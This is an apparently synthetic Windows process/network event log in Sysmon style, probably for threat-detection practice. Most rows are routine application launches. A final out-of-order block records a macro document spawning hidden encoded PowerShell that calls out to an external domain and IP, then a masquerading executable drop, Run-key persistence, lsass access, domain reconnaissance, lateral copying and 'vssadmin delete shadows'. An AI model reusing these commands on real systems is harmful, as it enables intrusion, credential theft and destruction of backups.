2026-05-11 09:37:03.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:37:18.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 09:37:23.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:37:29.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:38:01.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:38:27.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 09:38:35.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:39:06.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:39:46.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:40:12.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:40:35.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:40:38.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:41:15.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:41:23.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:41:59.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 09:42:28.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:42:40.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 09:42:55.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:42:58.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:43:09.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 09:43:32.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:44:12.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:44:24.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:44:43.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:45:03.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 09:45:38.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:45:49.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:46:00.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:46:26.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:46:29.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:46:57.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:47:34.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:47:39.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:47:53.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 09:48:23.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:48:30.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:48:47.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:49:03.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:49:07.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:49:27.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:49:32.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:49:49.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 09:50:21.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:50:36.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:50:50.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:51:01.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 09:51:37.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:51:44.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:52:11.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:52:24.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:52:41.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:52:57.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 09:53:15.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:53:37.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:54:11.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:54:20.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:54:40.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:55:18.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:55:25.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:55:53.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:56:26.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:56:48.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:57:06.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:14:00.000,1,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"WINWORD.EXE /n "C:\Users\j.park\Downloads\3월_정산내역_확인요망.docm"",,,
2026-05-11 09:14:08.000,1,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,FINANCE\\j.park,"powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",,,
2026-05-11 09:14:11.000,22,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,FINANCE\\j.park,"",,,cdn-telemetry-sync.net
2026-05-11 09:14:12.000,3,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,FINANCE\\j.park,"",,203.0.113.187,
2026-05-11 09:14:34.000,11,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,FINANCE\\j.park,"",C:\Users\j.park\AppData\Roaming\OneDriveSync.exe,,
2026-05-11 09:14:40.000,13,C:\Windows\System32\reg.exe,C:\Windows\System32\cmd.exe,FINANCE\\j.park,"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v OneDriveSync /d "C:\Users\j.park\AppData\Roaming\OneDriveSync.exe"",HKU\S-1-5-21\Software\Microsoft\Windows\CurrentVersion\Run\OneDriveSync,,
2026-05-11 09:18:40.000,10,C:\Users\j.park\AppData\Roaming\OneDriveSync.exe,,FINANCE\\j.park,"",C:\Windows\system32\lsass.exe,,
2026-05-11 09:19:01.000,1,C:\Windows\System32\cmd.exe,C:\Users\j.park\AppData\Roaming\OneDriveSync.exe,FINANCE\\j.park,"whoami /priv",,,
2026-05-11 09:19:54.000,1,C:\Windows\System32\cmd.exe,C:\Users\j.park\AppData\Roaming\OneDriveSync.exe,FINANCE\\j.park,"net group "Domain Admins" /domain",,,
2026-05-11 09:20:27.000,1,C:\Windows\System32\cmd.exe,C:\Users\j.park\AppData\Roaming\OneDriveSync.exe,FINANCE\\j.park,"nltest /dclist:finance.local",,,
2026-05-11 09:29:27.000,1,C:\Windows\System32\wbem\WmiPrvSE.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"WmiPrvSE.exe -Embedding",,,
2026-05-11 09:29:29.000,1,C:\Windows\System32\cmd.exe,C:\Windows\System32\wbem\WmiPrvSE.exe,FINANCE\\j.park,"cmd.exe /c copy \\SRV-FIN02\C$\temp\OneDriveSync.exe",,,
2026-05-11 09:47:29.000,1,C:\Windows\System32\vssadmin.exe,C:\Windows\System32\cmd.exe,FINANCE\\j.park,"vssadmin.exe delete shadows /all /quiet",,,
